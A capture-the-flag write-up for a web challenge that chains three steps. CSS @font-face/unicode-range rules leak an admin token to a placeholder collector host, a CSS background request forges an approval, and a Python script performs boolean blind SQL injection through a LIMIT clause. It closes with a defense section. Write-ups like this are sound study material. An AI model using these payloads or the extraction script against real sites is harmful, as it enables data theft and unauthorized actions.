Stylish is a Medium web challenge built around one uncomfortable idea: **CSS you can inject onto someone else's page is not harmless**. A "card generator" lets you submit raw CSS that an admin [puppeteer](https://cwe.mitre.org/data/definitions/79.html) bot then renders. The solve chains three links — **leak a secret with CSS**, **make the bot act with CSS**, and **read the flag with SQL**.

## Overview

You `POST` some `customCSS`; the app saves it and a headless-Chrome bot (whose requests come from `127.0.0.1`, which the app treats as *admin*) visits `/view/<id>` where your CSS is loaded as a `<link rel=stylesheet>`. That admin page holds a secret **approval token** in a hidden element, and the CSP has one deliberate hole. Leak the token by [CSS injection](https://cwe.mitre.org/data/definitions/79.html), use it to make the bot approve your own submission via a [same-origin forced request](https://cwe.mitre.org/data/definitions/352.html), then dump the flag through a [blind SQL injection](https://cwe.mitre.org/data/definitions/89.html) sitting in a `LIMIT` clause.

## The technique

### The setup (from source)

The admin's unapproved-review page embeds the secret token as hidden text next to *your* stylesheet:

```html
<link href="/card_styles/<id>.css" rel="stylesheet" />   <!-- your CSS runs on the admin page -->
<p id="approvalToken" class="d-none">{{ approvalToken }}</p>
```

The Content-Security-Policy is the crux:

```
default-src 'self'; img-src 'self'; style-src 'self'; font-src 'self' *;
```

`img-src 'self'` blocks the classic `background:url(//attacker)` image exfil — but **`font-src *`** allows fonts from *anywhere*. And the token is generated as `shuffle([0-9A-Za-z]).substring(0,32)` then **sorted, no duplicates**.

### Link 1 — leak the token with `@font-face` + `unicode-range`

CSS can't read text, but the browser fetches a webfont **only when a glyph in that font's `unicode-range` is actually painted**. Define one `@font-face` per candidate character, each pointing at a unique collector URL and scoped to a single codepoint, then apply that font to the secret element. Each callback that fires reveals one character present in the token.

```css
#approvalToken{display:block !important;font-family:x !important}
@font-face{font-family:x;src:url(https://a30.COLLAB/);unicode-range:U+30}   /* '0' */
@font-face{font-family:x;src:url(https://a41.COLLAB/);unicode-range:U+41}   /* 'A' */
/* ... one rule per [0-9A-Za-z] ... */
```

Two gotchas the challenge forces you to solve:

1. `#approvalToken` is `class="d-none"` (`display:none`), and hidden text triggers **no** webfont fetch. An `id` selector with `!important` beats Bootstrap's `.d-none` class, so we force it visible.
2. Because the token is **pre-sorted with no repeats**, we only need the character **set** — sorting the leaked characters reconstructs the exact token. No harder ordered-leak (ligatures/scrollbars) required.

One bot visit → 32 callbacks → sorted → the approval token.

> The collector must be reachable from the challenge container. On a NAT'd host, use webhook.site or Burp Collaborator and read hits back via their API — the bot has outbound internet, your box does not need to be inbound-reachable.

### Link 2 — make the bot approve, with CSS (CSRF, no JavaScript)

We have the token, but `/approve/<id>/<token>` is gated on `req.ip == 127.0.0.1` — only the bot can call it. So make the bot issue the request. A `background:url(...)` pointing at a **same-origin** path fires a GET that satisfies `img-src 'self'` and runs *as the bot* — a textbook [cross-site request forgery](https://cwe.mitre.org/data/definitions/352.html) with no script at all:

```css
html{background:url("/approve/<victimSubmissionId>/<leakedToken>")}
```

Submit that as a new card; when the bot renders it, our victim submission is approved by localhost.

### Link 3 — blind SQLi in `LIMIT ${pagination}`

Approved submissions unlock `/api/comment/entries`, whose query is string-concatenated:

```js
const stmt = `SELECT content FROM comments WHERE id_submission = ${id} LIMIT ${pagination}`;
```

`pagination` lands **after** the compound select, so `UNION` is a syntax error in SQLite. But `LIMIT` takes an expression, which gives a clean boolean oracle (seed one comment so a matching row exists — `1` row = true, `[]` = false):

```json
{"submissionID":"6","pagination":"(SELECT CASE WHEN (<cond>) THEN 1 ELSE 0 END)"}
```

Binary-search each character with `unicode(substr((<subquery>),i,1)) > mid`, first recovering the *randomly named* `flag_<hex>` table from `sqlite_master WHERE name LIKE 'flag%'`, then dumping the flag column.

## Solution

`solve.py` performs links 2–3 live (link 1's token is recovered live from the font callbacks):

```python
import sys, requests, concurrent.futures as cf

TARGET = "http://<target>"
TOKEN  = "<32-char approval token recovered via CSS font-face exfil>"
VID    = 6                                    # bot-self-approved victim submission

s = requests.Session()

def oracle(expr):
    r = s.post(f"{TARGET}/api/comment/entries",
               json={"submissionID": str(VID),
                     "pagination": f"(SELECT CASE WHEN ({expr}) THEN 1 ELSE 0 END)"},
               timeout=15)
    return r.text.strip() != "[]"             # non-empty = true, [] = false

def bsearch_char(inner, idx):                 # binary-search a codepoint, 7 requests/char
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr(({inner}),{idx},1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def length(inner, cap=80):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length(({inner})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract(inner, label):
    n = length(inner)
    out = [None] * n
    with cf.ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(bsearch_char, inner, i + 1): i for i in range(n)}
        for f in cf.as_completed(futs):
            out[futs[f]] = f.result()
    return "".join(out)

tbl  = extract("SELECT name FROM sqlite_master WHERE name LIKE 'flag%' LIMIT 1", "flag table")
flag = extract(f"SELECT flag FROM {tbl} LIMIT 1", "flag")
print("[+] FLAG:", flag)
```

Running it dumps the random table name, then the flag:

```
[*] flag table: flag_a640811e...
[*] flag: HTB{...}
```

## Why it worked

Three independent developer assumptions, each false:

- **"It's only CSS."** Rendering attacker-controlled CSS as a first-class stylesheet on a page that holds secrets turns styling into an exfiltration channel — the `@font-face` + `unicode-range` oracle leaks text one character at a time, and a wildcard `font-src` leaves the door open even when `img-src 'self'` blocks image exfil.
- **"Only localhost can approve."** Trusting `req.ip == 127.0.0.1` while letting attacker CSS render on the localhost bot's page means the attacker can drive an authenticated same-origin GET from the trusted context — the [CSRF](https://cwe.mitre.org/data/definitions/352.html) is performed *by* the privileged principal.
- **"It's just a number in `LIMIT`."** Every interpolated value is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) sink, including positions like `LIMIT`/`OFFSET` where `UNION` is impossible — the `LIMIT` expression itself becomes a boolean extraction oracle.

## Fix / defense

- **Never render untrusted CSS on a page containing secrets.** Sandbox the preview in a null-origin iframe, or don't co-locate the token with the stylesheet.
- **Drop the wildcard in CSP.** Self-host fonts and set `font-src 'self'` (and `connect-src 'self'`) so no external fetch channel exists.
- **Don't authorize by source IP.** Make state-changing actions `POST`-only, protected by an unguessable, single-use, per-session anti-CSRF token bound to the acting user.
- **Parameterize every query, including `LIMIT`/`OFFSET`.** Bind the value (`LIMIT ?`) or clamp it: `Math.min(Math.max(parseInt(pagination, 10) || 10, 1), 100)`.
